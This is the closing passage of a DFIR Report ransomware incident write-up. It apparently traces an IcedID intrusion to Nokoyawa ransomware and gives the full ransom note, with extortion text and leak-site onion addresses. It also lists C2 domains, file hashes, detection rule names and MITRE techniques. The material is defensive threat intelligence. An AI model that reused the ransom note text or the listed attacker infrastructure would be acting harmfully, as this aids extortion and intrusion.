<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-048.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30602" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-048.png" alt="" width="1229" height="90" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-048.png 1229w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-048-300x22.png 300w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-048-1024x75.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-048-768x56.png 768w" sizes="(max-width: 1229px) 100vw, 1229px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-049.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30603" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-049.png" alt="" width="1131" height="56" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-049.png 1131w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-049-300x15.png 300w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-049-1024x51.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-049-768x38.png 768w" sizes="(max-width: 1131px) 100vw, 1131px" /></a></p>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>After encrypting the back up server, the threat actors uninstalled the backup software using add/remove programs.</p>
<p>In addition, <em>notepad</em> was used to view the deployed ransom note after the final execution on the file server. The NOTE_CONTENT (from above base64 configuration) appears to be base64 encoded again and decoded gives the following ransom note:</p>
<pre>Nokoyawa.

If you see this, your files have been successfully encrypted and stolen.
Don't try to search free decryption method.
It's impossible. 
We are using symmetrical and asymmetric encryption.

ATTENTION:
	- Don't rename encrypted files.
	- Don't change encrypted files.
	- Don't use third party software.

You are risking irreversibly damaging the file by doing this.
If you manage to keep things quiet on your end, this will never be known to the public.
To reach an agreement you have 48 hours to visit our Onion Website.

How to open Onion links:
	- Download TOR Browser from official website.
	- Open and enter this link:
		http://nokopay&lt;REDACTED&gt;
	- On the page you will see a chat with the Support.
	- Send your first message.

Don't waste your time.
Otherwise all your valuable and sensitive data will be leaked.
Our websites are full of companies that doubted the fact of the data breach or it's extent.
	- http://nokoleakb76znymx443veg4n6fytx6spck6pc7nkr4dvfuygpub6jsid.onion/
	- http://hl66646wtlp2naoqnhattngigjp5palgqmbwixepcjyq5i534acgqyad.onion/
	- http://snatchteam.top
</pre>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The threat actors only deployed the ransomware on the two servers and did not perform a domain wide deployment. After the ransom of these two systems, the threat actor&#8217;s activity ceased.</p>
<p>Please consider leaving feedback on this report <a href="https://forms.office.com/r/YY6w3gwd6A" target="_blank" rel="noopener">here</a>.</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="timeline" class="wp-block-heading"><a href="#timeline">Timeline</a></h2>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-050-1.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30738" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-050-1.png" alt="" width="3148" height="7714" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-050-1.png 3148w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-050-1-122x300.png 122w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-050-1-418x1024.png 418w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-050-1-768x1882.png 768w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-050-1-627x1536.png 627w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-050-1-836x2048.png 836w" sizes="(max-width: 3148px) 100vw, 3148px" /></a></p>
<p>&nbsp;</p>
<!-- /wp:heading -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2 id="diamond-model" class="wp-block-heading"><a href="#diamond-model">Diamond Model</a></h2>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-051-1.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30727" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-051-1.png" alt="" width="4178" height="1852" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-051-1.png 4178w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-051-1-300x133.png 300w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-051-1-1024x454.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-051-1-768x340.png 768w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-051-1-1536x681.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-051-1-2048x908.png 2048w" sizes="(max-width: 4178px) 100vw, 4178px" /></a></p>
<p>&nbsp;</p>
<!-- /wp:heading -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2 id="indicators" class="wp-block-heading"><a href="#indicators">Indicators</a></h2>
<!-- /wp:heading -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Atomic</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<pre>IcedID
mrassociattes[.]com (174.138.188.6)
aerilaponawki[.]com (193.149.129.131)
klindriverfor[.]com (5.255.102.167)
alishaskainz[.]com (dr)

Cobalt Strike
msc-mvc-updates[.]com (91.215.85.183)

FileZilla File Exfiltration
45.155.204.5
</pre>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Computed</h3>
<!-- /wp:heading -->

<!-- wp:paragraph --><!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<pre>Contract_02_21_Copy#909.one
5f4d630ef00656726401b205ae4dc88f
aa8f2d6d98aa535e05685076ca02f781c2aa6464
9c337d27dab65fc3f4b88666338e13416f218ab75c4b5e37cc396241c225efe8

COIm.jpg
d1da347e78bf043e2dc61638e946c3da
d87a3c22771b1106a1a52d96df7b2944d93fa184
1ab812f7d829444dc703eeb02ea0a955ec839d5e2a9b619d44ac09a91135cad1

GET_ID.bat
a59a7916156c52f732b4c2e321facfe1  
8c949a7769d16c285347f650ef2eedac01dc1805  
eae2bce6341ff7059b9382bfa0e0daa337ea9948dd729c0c1e1ee9c11c1c0068  

INSTALL.ps1
b1f5e4774aa79f643350218df61e33f6  
f1e7994c6568f0182a60f64557c7793df5e550ed  
b378c2aa759625de2ad1be2c4045381d7474b82df7eb47842dc194bb9a134f76  

agaloz.dll
76a1f94ed6499b99d2cc500998846875
ca14d61bcf038cda45199f54c7c452ad262a7c88
d6127d614309acbf2a630fe3fb0fda8e4079dcf2045f91aa400d179751d425f7

csrss.exe/Funa2.exe
f927cd4f40c7a6dad769a8f9af771a8c  
0fdfef7c9cc4305df81b006e898e1592aa822437  
06bbb36baf63bc5cb14d7f097745955a4854a62fa3acef4d80c61b4fa002c542  

svchost.exe
8800e6f1501f69a0a04ce709e9fa251c  
72a1c9ea93d18309769d8be5cdb3daedf1cddcf5  
3c9f4145e310f616bd5e36ca177a3f370edc13cf2d54bb87fe99972ecf3f09b4  
</pre>
<!-- /wp:heading -->

<!-- wp:heading -->
<h2 id="detections" class="wp-block-heading"><a href="#detections">Detections</a></h2>
<!-- /wp:heading -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Network</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<pre>ET MALWARE Observed DNS Query to IcedID Domain (qoipaboni .com)
ET MALWARE Win32/IcedID Request Cookie
ET INFO Windows Powershell User-Agent Usage
ETPRO INFO HTTP Request with Lowercase accept Header Observed
ET MALWARE Cobalt Strike Malleable C2 (Unknown Profile)
ET SCAN Behavioral Unusual Port 1433 traffic Potential Scan or Infection
ET POLICY SMB2 NT Create AndX Request For an Executable File
ET SCAN Behavioral Unusual Port 445 traffic Potential Scan or Infection
ET POLICY HTTP traffic on port 443 (POST)
ET POLICY SMB2 NT Create AndX Request For a DLL File - Possible Lateral Movement
ET SCAN Potential SSH Scan OUTBOUND
ET HUNTING Possible Powershell .ps1 Script Use Over SMB
ET POLICY SMB2 NT Create AndX Request For a Powershell .ps1 File
ET HUNTING Suspicious csrss.exe in URI
ET INFO Executable Download from dotted-quad Host
ET INFO Dotted Quad Host DLL Request
</pre>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Sigma</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Search rules on <a href="https://detection.fyi/" target="_blank" rel="noreferrer noopener">detection.fyi</a> or <a href="https://sigmasearchengine.com/" target="_blank" rel="noreferrer noopener">sigmasearchengine.com</a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>DFIR Public Rules <a href="https://github.com/The-DFIR-Report/Sigma-Rules" target="_blank" rel="noreferrer noopener">Repo</a>:</p>
<pre>b26feb0b-8891-4e66-b2e7-ec91dc045d58 : AnyDesk Network
50046619-1037-49d7-91aa-54fc92923604 : AdFind Discovery
8a0d153f-b4e4-4ea7-9335-892dfbe17221 : NetScan Share Enumeration Write Access Check
</pre>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>DFIR Private Rules:</p>
<pre>baa9adf9-a01c-4c43-ac57-347b630bf69e : Default Cobalt Strike Named Pipes<br />a526e0c3-d53b-4d61-82a1-76d3d1358a30 : Silent Installation of AnyDesk RMM<br />b526e0c3-d53b-4d61-82a1-76d3d1358a31 : AnyDesk RMM Password Setup via Command Line<br />624f1f33-ee38-4bbe-9f4a-088014e0c26b : IcedID Malware Execution Patterns<br />37948baa-5310-424c-bb18-b29c56be160f : Suspicious Execution of DLL with Unusual File Extensions</pre>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Sigma <a href="https://github.com/SigmaHQ/sigma" target="_blank" rel="noreferrer noopener">Repo</a>:</p>
<pre>530a6faa-ff3d-4022-b315-50828e77eef5 : Anydesk Remote Access Software Service Installation
114e7f1c-f137-48c8-8f54-3088c24ce4b9 : Remote Access Tool - AnyDesk Silent Installation
b52e84a3-029e-4529-b09b-71d19dd27e94 : Remote Access Tool - AnyDesk Execution
b1377339-fda6-477a-b455-ac0923f9ec2c : Remote Access Tool - AnyDesk Piped Password Via CLI
065b00ca-5d5c-4557-ac95-64a6d0b64d86 : Remote Access Tool - Anydesk Execution From Suspicious Folder
9a132afa-654e-11eb-ae93-0242ac130002 : PUA - AdFind Suspicious Execution
903076ff-f442-475a-b667-4f246bcc203b : Nltest.EXE Execution
5cc90652-4cbd-4241-aa3b-4b462fa5a248 : Potential Recon Activity Via Nltest.EXE
0ef56343-059e-4cb6-adc1-4c3c967c5e46 : Suspicious Execution of Systeminfo
968eef52-9cff-4454-8992-1e74b9cbad6c : Reconnaissance Activity
e568650b-5dcd-4658-8f34-ded0b1e13992 : Potential Product Class Reconnaissance Via Wmic.EXE
fcc6d700-68d9-4241-9a1a-06874d621b06 : Suspicious File Created Via OneNote Application
d5601f8c-b26f-4ab0-9035-69e11a8d4ad2 : CobaltStrike Named Pipe
811e0002-b13b-4a15-9d00-a613fce66e42 : PUA - Process Hacker Execution
d5866ddf-ce8f-4aea-b28e-d96485a20d3d : Files With System Process Name In Unsuspected Locations
96036718-71cc-4027-a538-d1587e0006a7 : Windows Processes Suspicious Parent Directory
c8557060-9221-4448-8794-96320e6f3e74 : Windows PowerShell User Agent
</pre>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>JoeSecurity <a href="https://github.com/joesecurity/sigma-rules" target="_blank" rel="noreferrer noopener">Repo</a>:</p>
<pre>200068 : Execute DLL with spoofed extension</pre>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Yara</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/The-DFIR-Report/Yara-Rules/blob/main/19772/19772.yar" target="_blank" rel="noopener">https://github.com/The-DFIR-Report/Yara-Rules/blob/main/19772/19772.yar</a></p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="mitre" class="wp-block-heading"><a href="#mitre">MITRE</a></h2>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/19772-052-2.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30932" src="https://thedfirreport.com/wp-content/uploads/2024/04/19772-052-2.png" alt="" width="1816" height="2356" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/19772-052-2.png 1816w, https://thedfirreport.com/wp-content/uploads/2024/04/19772-052-2-231x300.png 231w, https://thedfirreport.com/wp-content/uploads/2024/04/19772-052-2-789x1024.png 789w, https://thedfirreport.com/wp-content/uploads/2024/04/19772-052-2-768x996.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/19772-052-2-1184x1536.png 1184w, https://thedfirreport.com/wp-content/uploads/2024/04/19772-052-2-1579x2048.png 1579w" sizes="(max-width: 1816px) 100vw, 1816px" /></a></p>
<p>&nbsp;</p>
<!-- /wp:heading -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<pre>Credentials In Files - T1552.001
Data Encrypted for Impact - T1486
Data from Network Shared Drive - T1039
Domain Groups - T1069.002
Domain Trust Discovery - T1482
Exfiltration Over Alternative Protocol - T1048
File and Directory Discovery - T1083
Indicator Removal - T1070
Ingress Tool Transfer - T1105
LSASS Memory - T1003.001
Malicious File - T1204.002
Masquerade File Type - T1036.008
Masquerading - T1036
Network Service Discovery - T1046
Phishing - T1566
PowerShell - T1059.001
Process Discovery - T1057
Process Injection - T1055
Regsvr32 - T1218.010
Remote Access Software - T1219
Remote Desktop Protocol - T1021.001
Remote System Discovery - T1018
Rundll32 - T1218.011
Scheduled Task - T1053.005
Security Software Discovery - T1518.001
System Information Discovery - T1082
System Owner/User Discovery - T1033
Web Protocols - T1071.001
Windows Command Shell - T1059.003
Windows Service - T1543.003
</pre>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Internal case #19772</p>
<!-- /wp:paragraph --><div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul><li class="share-twitter"><a rel="nofollow noopener noreferrer" data-shared="sharing-twitter-30547" class="share-twitter sd-button share-icon" href="https://thedfirreport.com/2024/04/01/from-onenote-to-ransomnote-an-ice-cold-intrusion/?share=twitter" target="_blank" title="Click to share on Twitter" ><span>Twitter</span></a></li><li class="share-linkedin"><a rel="nofollow noopener noreferrer" data-shared="sharing-linkedin-30547" class="share-linkedin sd-button share-icon" href="https://thedfirreport.com/2024/04/01/from-onenote-to-ransomnote-an-ice-cold-intrusion/?share=linkedin" target="_blank" title="Click to share on LinkedIn" ><span>LinkedIn</span></a></li><li class="share-reddit"><a rel="nofollow noopener noreferrer" data-shared="" class="share-reddit sd-button share-icon" href="https://thedfirreport.com/2024/04/01/from-onenote-to-ransomnote-an-ice-cold-intrusion/?share=reddit" target="_blank" title="Click to share on Reddit" ><span>Reddit</span></a></li><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-30547" class="share-facebook sd-button share-icon" href="https://thedfirreport.com/2024/04/01/from-onenote-to-ransomnote-an-ice-cold-intrusion/?share=facebook" target="_blank" title="Click to share on Facebook" ><span>Facebook</span></a></li><li class="share-jetpack-whatsapp"><a rel="nofollow noopener noreferrer" data-shared="" class="share-jetpack-whatsapp sd-button share-icon" href="https://thedfirreport.com/2024/04/01/from-onenote-to-ransomnote-an-ice-cold-intrusion/?share=jetpack-whatsapp" target="_blank" title="Click to share on WhatsApp" ><span>WhatsApp</span></a></li><li class="share-end"></li></ul></div></div></div>
<div id='jp-relatedposts' class='jp-relatedposts' >
	<h3 class="jp-relatedposts-headline"><em>Related</em></h3>
</div>
	</div><!-- .entry-content -->

	
		<footer class="entry-footer">
			<div class="entry-meta">

							</div><!-- .entry-meta -->
		</footer><!-- .entry-footer -->
			
		</div><!-- .entry-content-holder -->
</article><!-- #post-30547 -->

	<nav class="navigation post-navigation" aria-label="Posts">
		<h2 class="screen-reader-text">Post navigation</h2>
		<div class="nav-links"><div class="nav-previous"><a href="https://thedfirreport.com/2024/03/04/threat-brief-wordpress-exploit-leads-to-godzilla-web-shell-discovery-new-cve/" rel="prev">Threat Brief: WordPress Plugin Exploit Leads to Godzilla Web Shell, Discovery &#038; New CVE</a></div><div class="nav-next"><a href="https://thedfirreport.com/2024/04/29/from-icedid-to-dagon-locker-ransomware-in-29-days/" rel="next">From IcedID to Dagon Locker Ransomware in 29 Days</a></div></div>
	</nav>
		</main><!-- #main -->
	</div><!-- #primary -->


<aside id="secondary" class="widget-area">
	<section id="search-4" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://thedfirreport.com/">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section><section id="google_translate_widget-5" class="widget widget_google_translate_widget"><div id="google_translate_element"></div></section><section id="block-7" class="widget widget_block">	<div class="wp-block-jetpack-subscriptions__supports-newline wp-block-jetpack-subscriptions">
		<div class="wp-block-jetpack-subscriptions__container is-not-subscriber">
							<form
					action="https://wordpress.com/email-subscriptions"
					method="post"
					accept-charset="utf-8"
					data-blog="175340963"
					data-post_access_level="everybody"
					data-subscriber_email=""
					id="subscribe-blog"
				>
					<div class="wp-block-jetpack-subscriptions__form-elements">
												<p id="subscribe-email">
							<label
								id="subscribe-field-label"
								for="subscribe-field"
								class="screen-reader-text"
							>
								Type your email…							</label>
							<input
									required="required"
									type="email"
									name="email"
									class="no-border-radius "
									style="font-size: 16px;padding: 15px 23px 15px 23px;border-radius: 0px;border-width: 1px;"
									placeholder="Type your email…"
									value=""
									id="subscribe-field"
									title="Please fill in this field."
								/>						</p>
												<p id="subscribe-submit"
													>
							<input type="hidden" name="action" value="subscribe"/>
							<input type="hidden" name="blog_id" value="175340963"/>
							<input type="hidden" name="source" value="https://thedfirreport.com/2024/04/01/from-onenote-to-ransomnote-an-ice-cold-intrusion/"/>
							<input type="hidden" name="sub-type" value="subscribe-block"/>
							<input type="hidden" name="app_source" value=""/>
							<input type="hidden" name="redirect_fragment" value="subscribe-blog"/>
							<input type="hidden" name="lang" value="en_US"/>
							<input type="hidden" id="_wpnonce" name="_wpnonce" value="1265e6b2da" /><input type="hidden" name="_wp_http_referer" value="/2024/04/01/from-onenote-to-ransomnote-an-ice-cold-intrusion/" /><input type="hidden" name="post_id" value="30547"/>							<button type="submit"
																	class="wp-block-button__link no-border-radius"
																									style="font-size: 16px;padding: 15px 23px 15px 23px;margin: 0; margin-left: 10px;border-radius: 0px;border-width: 1px;"
																name="jetpack_subscriptions_widget"
							>
								Subscribe							</button>
						</p>
					</div>
				</form>
								</div>
	</div>
	</section><section id="block-21" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://the-dfir-report-store.myshopify.com/products/dfir-labs-ctf-july-6-16-00-20-00-utc"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1.png" alt="" class="wp-image-35571 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1.png 200w, https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h4 class="wp-block-heading"><a href="https://the-dfir-report-store.myshopify.com/products/dfir-labs-ctf-july-6-16-00-20-00-utc">Register For Our Next CTF</a></h4>
</div></div>
</section><section id="block-8" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s.png" alt="" class="wp-image-21332 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/" data-type="link" data-id="https://thedfirreport.com/">Reports</a></h3>
</div></div>
</section><section id="block-9" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/threat-intelligence/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s.png" alt="" class="wp-image-21334 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></h3>
</div></div>
</section><section id="block-10" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/detection-rules/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s.png" alt="" class="wp-image-21336 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></h3>
</div></div>
</section><section id="block-16" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/dfir-labs/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2024/04/labs-s.png" alt="" class="wp-image-31051 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/labs-s.png 200w, https://thedfirreport.com/wp-content/uploads/2024/04/labs-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a></h3>
</div></div>
</section><section id="block-12" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/mentoring-coaching-program/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/help4-s.png" alt="" class="wp-image-21333 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/help4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/help4-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring and Coaching</a></h3>
</div></div>
</section></aside><!-- #secondary -->
</div><!-- .wrap .wrap-width-->
		</div><!-- .site-content-cell -->
	</div><!-- #content -->
	
	<footer id="colophon" class="site-footer" role="contentinfo">

			
		<div class="copyright-area">
			<div class="wrap">
								<div class="site-info">
					    <a href="https://wordpress.org/">
Proudly powered by WordPress</a>
<span class="sep"> | </span>
Copyright 2023 | The DFIR Report | All Rights Reserved				</div><!-- .site-info -->
												<div class="footer-right-info">
															</div>
									</div><!-- .wrap -->
		</div><!-- .copyright-area -->
	</footer><!-- #colophon -->
			<button href="#" class="back-to-top" type="button"><i class="fa-solid fa-arrow-up-long"></i>Go Top</button>
	</div><!-- #page -->


	<script type="a9e82b8cbaa2b80ee152d32d-text/javascript">
		window.WPCOM_sharing_counts = {"https:\/\/thedfirreport.com\/2024\/04\/01\/from-onenote-to-ransomnote-an-ice-cold-intrusion\/":30547};
	</script>
				<style id='jetpack-block-subscriptions-inline-css' type='text/css'>
.is-style-compact .is-not-subscriber .wp-block-button__link,.is-style-compact .is-not-subscriber .wp-block-jetpack-subscriptions__button{border-end-start-radius:0!important;border-start-start-radius:0!important;margin-inline-start:0!important}.is-style-compact .is-not-subscriber .components-text-control__input,.is-style-compact .is-not-subscriber p#subscribe-email input[type=email]{border-end-end-radius:0!important;border-start-end-radius:0!important}.is-style-compact:not(.wp-block-jetpack-subscriptions__use-newline) .components-text-control__input{border-inline-end-width:0!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form-container{display:flex;flex-direction:column}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline:not(.wp-block-jetpack-subscriptions__use-newline) .is-not-subscriber .wp-block-jetpack-subscriptions__form-elements{align-items:flex-start;display:flex}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline:not(.wp-block-jetpack-subscriptions__use-newline) p#subscribe-submit{display:flex;justify-content:center}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]{box-sizing:border-box;cursor:pointer;line-height:1.3;min-width:auto!important;white-space:nowrap!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button[contenteditable=true],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button[contenteditable=true]{white-space:pre-wrap!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email]::placeholder,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email]:disabled,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]::placeholder,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]:disabled{color:currentColor;opacity:.5}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form button{border-color:#0000;border-style:solid}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email{background:#0000;flex-grow:1}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email 